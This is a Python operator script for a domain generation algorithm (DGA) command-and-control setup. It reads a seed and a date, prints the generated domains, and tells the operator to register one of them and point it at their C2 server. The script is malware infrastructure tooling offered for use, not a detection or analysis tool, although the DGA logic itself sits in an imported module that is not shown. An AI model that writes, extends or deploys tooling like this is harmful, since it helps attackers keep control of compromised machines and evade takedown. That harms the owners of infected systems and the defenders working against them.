import argparse
import logging
from modules.dga import generate_domains
import datetime

def main():
    parser = argparse.ArgumentParser(description="Operator script for the DGA C2.")
    parser.add_argument("command", choices=['generate'], help="The action to perform.")
    parser.add_argument("--seed", required=True, help="The DGA seed to use.")
    parser.add_argument("--date", help="The date to generate domains for (YYYY-MM-DD). Defaults to today.")

    args = parser.parse_args()

    if args.date:
        try:
            date_obj = datetime.datetime.strptime(args.date, '%Y-%m-%d').date()
        except ValueError:
            print("Error: Invalid date format. Please use YYYY-MM-DD.")
            return
    else:
        date_obj = datetime.date.today()

    if args.command == 'generate':
        print(f"--- DGA Domains for {date_obj} ---")
        domains = generate_domains(args.seed, date_obj)
        for domain in domains:
            print(f"  - {domain}")
        print("\nEnsure one of these domains is registered and pointing to your C2 server.")

if __name__ == "__main__":
    main()